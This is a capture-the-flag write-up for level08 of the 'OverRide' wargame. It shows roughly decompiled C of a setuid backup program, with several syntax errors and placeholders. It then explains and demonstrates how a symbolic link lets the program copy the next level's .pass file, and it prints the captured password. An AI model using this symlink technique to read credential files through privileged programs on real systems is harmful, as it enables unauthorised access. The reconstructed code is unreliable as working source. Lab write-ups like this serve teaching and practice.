## level08 (file permission bypass using softlink)
```clike=

void log_wrapper(FILE *logfile, char *string, char *inpfile_path)
{
    int count = 40;
    char dest[?];
    
    strcpy(dest, string);
    snprintf(dest + strlen(dest), 254 - strlen(dest) - 1, inpfile_path);
    dest[strcspn(dest, "/n")] = 0;
    fprintf(logfile, "LOG: %s", dest);
}

int main(int argc, char **argv)
{
    int argc_stck = argc;
    char **argv_stack = argv;
    int count = 48;
    char currchar = EOF;
    FILE *logfile;    
    char *prefix = "./backups";
    char dest[?];
    int backupfile;
    
    if (argc != 2)
        printf("Usage: %s filename", argv[0]);
    logfile = fopen("/backups/.log", "w");
    if (!logfile)
    {
        printf("ERROR: Failed to open %s", "/backups/.log");
        exit(1);
    }
    log_wrapper(logfile, "Starting back up:", argv_stack[1]);
    inputfilestream = fopen(argv_stack[1], "r");
    if (!inputfilestream)
    {
        printf("ERROR: Failed to open %s", argv_stack[1]);
        exit(1)
    }
    strcpy(dest, prefix);
    strncat(dest, argv_stack[1], 99 - strlen(dest) - 1);
    backupfile = open(prefix, O_CREAT | O_EXCL | O_WRONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
    if (backupfile < 1)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv_stack[1]);
        exit(1);
    }
     while((currchar = fgetc(inputfilestream)) != EOF)
        write(backupfile, &currchar, 1);
    log_wrapper(logfile, "Finished back up", argv_stack[1]);
    fclose(inputfilestream);
    close(backupfile);
    return 0;
}
```

The program has a **stack canary implemented**, so the approach to overwrite the EIP might not be the way. The program takes a file as an input, reads it character by character, creates a new file in `./backups` and writes it to their own backup files accordingly.

The exploit is quite straightforward, I will need to go to a **writable directory**, **create a soft link** to `/home/users/level09/.pass` and pass that link as as argument to the binary. The program will create a backup file and write its contents in `backups/<linkname>`. The password is `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`

```
level08@OverRide:/tmp/level08$ ln -s /home/users/level09/.pass link1
level08@OverRide:/tmp/level08$ /home/users/level08/level08 link1
ERROR: Failed to open ./backups/link1
level08@OverRide:/tmp/level08$ rm backups/link1
level08@OverRide:/tmp/level08$ /home/users/level08/level08 link1
level08@OverRide:/tmp/level08$ cat backups/link1
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp/level08$
```

